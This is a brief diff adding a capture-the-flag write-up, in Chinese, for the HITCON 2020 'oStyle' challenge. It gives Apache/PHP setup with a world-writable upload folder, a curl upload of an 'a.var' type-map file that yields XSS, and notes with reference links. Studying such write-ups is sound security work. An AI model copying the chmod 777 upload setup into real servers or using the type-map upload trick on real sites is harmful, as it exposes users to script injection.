@@ -1,0 +1,22 @@
+apt update && apt install -y apache2 libapache2-mod-php7.4 python3 python3-pip
+cp index.php /var/www/html
+mkdir /var/www/html/upload 
+chmod 777 /var/www/html/upload
+
+######## 解答
+curl -F 'file=@"ans";filename="a.var"' -x localhost:8080 http://localhost
+
+######## 訪問該位址, 就會發現 xss 成功了
+
+
+
+######## 註
+
+php -S localhost:8888 會失敗, 因為這是 apache 的 type-map 導致的
+
+
+題目為 hitcon 2020 ostyle
+
+下方是 cyku 提供的連結
+ref: http://saturn.ihp.sinica.edu.tw/manual/mod/mod_negotiation.html
+ref: http://jkorpela.fi/multi/6.html
